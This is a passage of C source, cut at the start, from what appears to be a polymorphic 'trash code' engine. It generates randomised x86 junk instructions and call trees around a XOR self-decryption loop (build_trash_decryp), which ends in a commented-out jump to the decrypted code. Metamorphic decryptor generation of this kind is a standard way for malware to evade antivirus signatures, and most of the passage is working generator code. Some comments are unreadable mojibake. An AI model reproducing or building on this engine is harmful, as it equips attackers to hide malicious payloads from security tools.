						t->lc+=_OP_LR(b,_OP_TYPE[0],-t->reg[reg1].var*4,reg1);
						t->lc+=_OP_RC(b,_OP_TYPE[op],reg1,c2);
						t->reg[reg1].l_st=true;
					}else{
						t->lc+=_OP_RC(b,_OP_TYPE[op],reg1,c2);
					}
				}break;
			};
		}break;
		case 1:{
			switch(op2){
				case T_OP_LC:{
					k=get_var(t);
					if (k==-1) break;
					t->lc+=_OP_LC(b,_OP_TYPE[op],-k*4,c2);
				}break;
				case T_DEC_L:{
					k=get_var(t);
					if (k==-1) break;
					t->lc+=_DEC_L(b,-k*4);
				}break;
				case T_INC_L:{
					k=get_var(t);
					if (k==-1) break;
					t->lc+=_INC_L(b,-k*4);
				}break;
				case T_SHR_RC:{
					if (t->reg[reg1].st && !t->reg[reg1].l_st){
						t->lc+=_OP_LR(b,_OP_TYPE[0],-t->reg[reg1].var*4,reg1);
						t->lc+=_SHR_RC(b,reg1,c2%10);
						t->reg[reg1].l_st=true;
					}else{
						t->lc+=_SHR_RC(b,reg1,c2%10);
					}
				}break;
				case T_DEC_R:{
					if (t->reg[reg1].st && !t->reg[reg1].l_st){
						t->lc+=_OP_LR(b,_OP_TYPE[0],-t->reg[reg1].var*4,reg1);
						t->lc+=_DEC_R(b,reg1);
						t->reg[reg1].l_st=true;
					}else{
						t->lc+=_DEC_R(b,reg1);
					}
				}break;
				case T_INC_R:{
					if (t->reg[reg1].st && !t->reg[reg1].l_st){
						t->lc+=_OP_LR(b,_OP_TYPE[0],-t->reg[reg1].var*4,reg1);
						t->lc+=_INC_R(b,reg1);
						t->reg[reg1].l_st=true;
					}else{
						t->lc+=_INC_R(b,reg1);
					}
				}break;
				case T_SHL_RC:{
					if (t->reg[reg1].st && !t->reg[reg1].l_st){
						t->lc+=_OP_LR(b,_OP_TYPE[0],-t->reg[reg1].var*4,reg1);
						t->lc+=_SHL_RC(b,reg1,c2%10);
						t->reg[reg1].l_st=true;
					}else{
						t->lc+=_SHL_RC(b,reg1,c2%10);
					}
				}break;
				case T_LEA_RA:{
					if (t->reg[reg1].st && !t->reg[reg1].l_st){
						t->lc+=_OP_LR(b,_OP_TYPE[0],-t->reg[reg1].var*4,reg1);
						t->lc+=_LEA_RA(b,reg1,c2);
						t->reg[reg1].l_st=true;
					}else{
						t->lc+=_LEA_RA(b,reg1,c2);
					}
				}break;
				case T_LEA_RRA:{
					if (t->reg[reg1].st && !t->reg[reg1].l_st){
						t->lc+=_OP_LR(b,_OP_TYPE[0],-t->reg[reg1].var*4,reg1);
						t->lc+=_LEA_RRA(b,reg1,reg2,c2);
						t->reg[reg1].l_st=true;
					}else{
						t->lc+=_LEA_RRA(b,reg1,reg2,c2);
					}
				}break;
			}
		}break;
		case 2:{

		}break;
	}

}


uint32 gen_op(BLOCK *b,GEN_OP *c){
	int l=0;
	switch(c->op){
		case T_OP_AC:{
			l+=_OP_AC(b,c->subop,c->c1,c->c2);
			break;
		}
		case T_OP_RR:{
			l+=_OP_RR(b,c->subop,c->reg1,c->reg2);
			break;
		}
		case T_OP_RC:{
			l+=_OP_RC(b,c->subop,c->reg1,c->c2);
			break;
		}
		case T_OP_RA:{
			l+=_OP_RA(b,c->subop,c->reg1,c->c2);
			break;
		}
		case T_OP_AR:{
			l+=_OP_AR(b,c->subop,c->c1,c->reg2);
			break;
		}
		case T_OP_ArR:{
			l+=_OP_ArR(b,c->subop,c->reg1,c->reg2);
			break;
		}
		case T_OP_RAr:{
			l+=_OP_RAr(b,c->subop,c->reg1,c->reg2);
			break;
		}
		case T_OP_LR:{
			l+=_OP_LR(b,c->subop,-c->loc*4,c->reg2);
			break;
		}
		case T_OP_RL:{
			l+=_OP_RL(b,c->subop,c->reg1,-c->loc*4);
			break;
		}
		case T_OP_LC:{
			l+=_OP_LC(b,c->subop,-c->loc*4,c->c2);
			break;
		}
		case T_LEA_RRA:{
			l+=_LEA_RRA(b,c->reg1,c->reg2,c->c2);
			break;
		}
		case T_LEA_RA:{
			l+=_LEA_RA(b,c->reg1,c->c2);
			break;
		}
		case T_SHR_RC:{
			l+=_SHR_RC(b,c->reg1,c->c2);
			break;
		}
		case T_SHL_RC:{
			l+=_SHL_RC(b,c->reg1,c->c2);
			break;
		}
		case T_DEC_L:{
			l+=_DEC_L(b,-c->loc*4);
			break;
		}
		case T_INC_L:{
			l+=_INC_L(b,-c->loc*4);
			break;
		}
		case T_DEC_R:{
			l+=_DEC_R(b,c->reg1);
			break;
		}
		case T_INC_R:{
			l+=_INC_R(b,c->reg1);
			break;
		}
	}
	return l;
}

void gen_call_op(BLOCK *b,TRASH *t,GEN_OP *o){
	BLOCK g;
	g.size=0;
	init_reg_var(t);
	int n1=rnd()%10+3;
	int n2=rnd()%10+3;
	gen_block(&g,t,n1);
	if (o->st){
		restore_reg(&g,t,o->reg1);
		restore_reg(&g,t,o->reg2);
		t->lc+=gen_op(&g,o);
	}
	gen_block(&g,t,n2);
	restore_regs(&g,t);
	GEN_CALL c;
	c.loc=t->l_size;
	c.narg=o->narg;
	gen_call(b,&c,&g);
	m_free(g.data);
}

int gen_list_push(BLOCK *b,TRASH *t,int n){
	int l=0;
	for (int i=0;i<n;i++){
		int k=rnd()%3;
		switch(k){
		case 0:{
			int loc=rnd()%t->l_size;
			l+=_PUSH_L(b,-loc*4);
			break;
		}
		case 1:{
			int reg=rnd()%(sizeof(_REG)/4);
			l+=_PUSH_R(b,_REG[reg]);
			break;
		}
		case 2:{
			int m=rnd()%2;
			int a;
			if (m==0)
				a=t->data+rnd()%(t->d_size);
			else
				a=rnd()%(0x2000);
			l+=_PUSH_C(b,a);
			break;
		}
		}
	}
	return l;
}

void gen_list_call(BLOCK *b,TRASH *t,GEN_OP *o,GEN_ITEM_CALL *it,GEN_LIST_CALL *lc){
	int n=rnd()%4+2;
	GEN_ITEM_CALL list[7];
	int n_o=rnd()%(n+1);
	int n_i=rnd()%n;
	int n_c=rnd()%n;
	bool st=o->st;
	for (int i=0;i<n;i++){
		if (i==n_o){
			o->st=st;
		}else{
			o->st=false;
		}
		list[i].offset=b->size;
		list[i].narg=rnd()%8;
		o->narg=list[i].narg;
		gen_call_op(b,t,o);
	}

	o->st=st;
	BLOCK g;
	g.size=0;
	init_reg_var(t);
	it->offset=b->size;
	for (int i=0;i<n;i++){
		int k=rnd()%8;
		gen_block(&g,t,k);
		restore_regs(&g,t);
		if (n_c==i && lc){//��������� call �� ��������
			for (int j=0;j<lc->count;j++){
				gen_list_push(&g,t,lc->list[j].narg);
				_CALL_C(&g,(lc->list[j].offset)-(b->size+9+g.size+5));
				int k=rnd()%8;
				gen_block(&g,t,k);
				restore_regs(&g,t);
			}
		}
		if ((n_i==i) && n_o==n && o->st){//����� call ����������!!!
			gen_op(&g,o);
		}
		gen_list_push(&g,t,list[i].narg);
		_CALL_C(&g,(list[i].offset)-(b->size+9+g.size+5));
	}
	restore_regs(&g,t);
	GEN_CALL gc;
	gc.loc=t->l_size;
	gc.narg=it->narg;
	gen_call(b,&gc,&g);
	m_free(g.data);
}

void gen_tree_op(BLOCK *b,TRASH *t,GEN_OP *o,GEN_ITEM_CALL *it){
	GEN_ITEM_CALL it1,it2[6];
	GEN_LIST_CALL lc;
	lc.list=it2;
	bool st=o->st;
	o->st=false;
	int n=rnd()%5+1;
	int ind=rnd()%(n+1);
	lc.list[0].narg=rnd()%8;
	gen_list_call(b,t,o,&lc.list[0],0);//����������� �������

	for (int i=0;i<n;i++){
		//��������� �������
		int k=rnd()%5+1;
		lc.count=k;
		for (int j=1;j<lc.count;j++){ //������� �������� �������
			lc.list[j].narg=rnd()%8;
			gen_list_call(b,t,o,&lc.list[j],0);
		}

		if (ind==i) 
			o->st=st;
		it1.narg=rnd()%8;

		gen_list_call(b,t,o,&it1,&lc);//��������� ����
		lc.list[0]=it1;
		o->st=false;
	}

	int k=rnd()%5+1;
	lc.count=k;
	for (int j=1;j<lc.count;j++){
		lc.list[j].narg=rnd()%8;
		gen_list_call(b,t,o,&lc.list[j],0);
	}

	if (ind==n) 
		o->st=st;

	gen_list_call(b,t,o,it,&lc);
	o->st=st;
}

/*
//	mov eax,data - ����� eip
	mov edx,eax
	add edx,size
	mov ebx,key
//	mov ecx,size
next:
	xor [eax],ebx
	add ebx,key
	add eax,4
	cmp eax,edx
	jb next
	sub eax,size
	add eax,e

	
*/

void build_trash_decryp(BLOCK *b,uint32 key,uint32 d,uint32 size,uint32 e,GEN_ITEM_CALL *itc){
	TRASH t;
	t.base=d;
	t.data=d;
	t.d_size=size-4;
	t.l_size=0x100;
	t.lc=0;
	
	memset(&t.reg[0],0,sizeof(TRASH_ITEM)*8);
	t.reg[_EAX].st=true;
	t.reg[_EAX].var=get_var(&t);
	t.reg[_ECX].st=true;
	t.reg[_ECX].var=get_var(&t);
	t.reg[_EBX].st=true;
	t.reg[_EBX].var=get_var(&t);
	t.reg[_EDX].st=true;
	t.reg[_EDX].var=get_var(&t);
	t.type=0;
	GEN_ITEM_CALL it[20];
	memset(it,0,sizeof(it));
	BLOCK g;
	g.size=0;
	GEN_OP o;
	int i=0;

	if (d>0){
		//mov eax,p
		o.op=T_OP_RC;
		o.subop=_MOV;
		o.reg1=_EAX;
		o.c2=d;
		o.st=true;
		it[i].narg=rnd()%8;
		gen_tree_op(b,&t,&o,&it[i]);
		i++;
	}
	//mov edx,eax
	o.op=T_OP_RR;
	o.subop=_MOV;
	o.reg1=_EDX;
	o.reg2=_EAX;
	o.st=true;
	it[i].narg=rnd()%8;
	gen_tree_op(b,&t,&o,&it[i]);
	i++;

	//add edx,size
	o.op=T_OP_RC;
	o.subop=_ADD;
	o.reg1=_EDX;
	o.c2=size;
	o.st=true;
	it[i].narg=rnd()%8;
	gen_tree_op(b,&t,&o,&it[i]);
	i++;

	//mov ebx,key
	o.op=T_OP_RC;
	o.subop=_MOV;
	o.reg1=_EBX;
	o.c2=key;
	o.st=true;
	it[i].narg=rnd()%8;
	gen_tree_op(b,&t,&o,&it[i]);
	i++;
/*
	//mov ecx,size
	o.op=T_OP_RC;
	o.subop=_MOV;
	o.reg1=_ECX;
	o.c2=size;
	o.st=true;
	it[i].narg=rnd()%8;
	gen_tree_op(b,&t,&o,&it[i]);
	i++;
*/
	//xor [eax],ebx
	o.op=T_OP_ArR;
	o.subop=_XOR;
	o.reg1=_EAX;
	o.reg2=_EBX;
	o.st=true;
	it[i].narg=rnd()%8;
	gen_tree_op(b,&t,&o,&it[i]);
	i++;

	//add ebx,key
	o.op=T_OP_RC;
	o.subop=_ADD;
	o.reg1=_EBX;
	o.c2=key;
	o.st=true;
	it[i].narg=rnd()%8;
	gen_tree_op(b,&t,&o,&it[i]);
	i++;


	//add eax,4
	o.op=T_OP_RC;
	o.subop=_ADD;
	o.reg1=_EAX;
	o.c2=4;
	o.st=true;
	it[i].narg=rnd()%8;
	gen_tree_op(b,&t,&o,&it[i]);
	i++;

	//cmp eax,edx
	o.op=T_OP_RR;
	o.subop=_CMP;
	o.reg1=_EAX;
	o.reg2=_EDX;
	o.st=true;
	it[i].narg=rnd()%8;
	gen_tree_op(b,&t,&o,&it[i]);
	i++;

	//sub eax,size
	o.op=T_OP_RC;
	o.subop=_SUB;
	o.reg1=_EAX;
	o.c2=size;
	o.st=true;
	it[i].narg=rnd()%8;
	gen_tree_op(b,&t,&o,&it[i]);
	i++;

	if (e>0){
		//add eax,e
		o.op=T_OP_RC;
		o.subop=_ADD;
		o.reg1=_EAX;
		o.c2=e;
		o.st=true;
		it[i].narg=rnd()%8;
		gen_tree_op(b,&t,&o,&it[i]);
		i++;
	}

	GEN_LIST_CALL lc;
	lc.list=it;
	lc.count=i;
	
	int j=0;
	int k;
	if (d>0){
		//mov eax,p
		k=rnd()%8;
		gen_block(&g,&t,k);
		restore_regs(&g,&t);
		gen_list_push(&g,&t,lc.list[j].narg);
		_CALL_C(&g,(lc.list[j].offset)-(b->size+9+g.size+5));
		j++;
	}
	//mov edx,eax
	k=rnd()%8;
	gen_block(&g,&t,k);
	restore_regs(&g,&t);
	gen_list_push(&g,&t,lc.list[j].narg);
	_CALL_C(&g,(lc.list[j].offset)-(b->size+9+g.size+5));
	j++;

	//add edx,size
	k=rnd()%8;
	gen_block(&g,&t,k);
	restore_regs(&g,&t);
	gen_list_push(&g,&t,lc.list[j].narg);
	_CALL_C(&g,(lc.list[j].offset)-(b->size+9+g.size+5));
	j++;

	//mov ebx,key
	k=rnd()%8;
	gen_block(&g,&t,k);
	restore_regs(&g,&t);
	gen_list_push(&g,&t,lc.list[j].narg);
	_CALL_C(&g,(lc.list[j].offset)-(b->size+9+g.size+5));
	j++;
/*
	//mov ecx,size
	k=rnd()%8;
	gen_block(&g,&t,k);
	restore_regs(&g,&t);
	gen_list_push(&g,&t,lc.list[j].narg);
	_CALL_C(&g,(lc.list[j].offset)-(b->size+9+g.size+5));
	j++;
*/
	uint32 next=g.size;

	//xor [eax],ebx
	k=rnd()%8;
	gen_block(&g,&t,k);
	restore_regs(&g,&t);
	gen_list_push(&g,&t,lc.list[j].narg);
	_CALL_C(&g,(lc.list[j].offset)-(b->size+9+g.size+5));
	j++;

	//add ebx,[eax]
	k=rnd()%8;
	gen_block(&g,&t,k);
	restore_regs(&g,&t);
	gen_list_push(&g,&t,lc.list[j].narg);
	_CALL_C(&g,(lc.list[j].offset)-(b->size+9+g.size+5));
	j++;

	//add eax,4
	k=rnd()%8;
	gen_block(&g,&t,k);
	restore_regs(&g,&t);
	gen_list_push(&g,&t,lc.list[j].narg);
	_CALL_C(&g,(lc.list[j].offset)-(b->size+9+g.size+5));
	j++;

	//cmp eax,edx
	k=rnd()%8;
	gen_block(&g,&t,k);
	restore_regs(&g,&t);
	_OP_RR(&g,_CMP,_EAX,_EDX);
	_JB_C(&g,next-(g.size+6));

	//sub eax,size
	k=rnd()%8;
	gen_block(&g,&t,k);
	restore_regs(&g,&t);
	gen_list_push(&g,&t,lc.list[j].narg);
	_CALL_C(&g,(lc.list[j].offset)-(b->size+9+g.size+5));
	j++;

	//add eax,e
	k=rnd()%8;
	gen_block(&g,&t,k);
	restore_regs(&g,&t);
	gen_list_push(&g,&t,lc.list[j].narg);
	_CALL_C(&g,(lc.list[j].offset)-(b->size+9+g.size+5));
	j++;
/*
	//jmp eax
	k=rnd()%8;
	gen_block(&g,&t,k);
	restore_regs(&g,&t);
	_JMP_R(&g,_EAX);
*/

	GEN_CALL gc;
	gc.narg=rnd()%8;
	gc.loc=t.l_size;
	gen_call(b,&gc,&g);

	GEN_ITEM_CALL itc1,itc2;
	
	GEN_LIST_CALL lc1;
	lc1.count=1;
	lc1.list=&itc2;
	lc1.list[0].narg=gc.narg;
	lc1.list[0].offset=gc.offset;
	itc1.narg=0;
	itc1.offset=0;
	o.st=false;
	gen_list_call(b,&t,&o,&itc1,&lc1);
	itc->offset=b->size;
	_CALL_C(b,itc1.offset-(b->size+5));
	//_RET_C(b,0);
	m_free(g.data);
}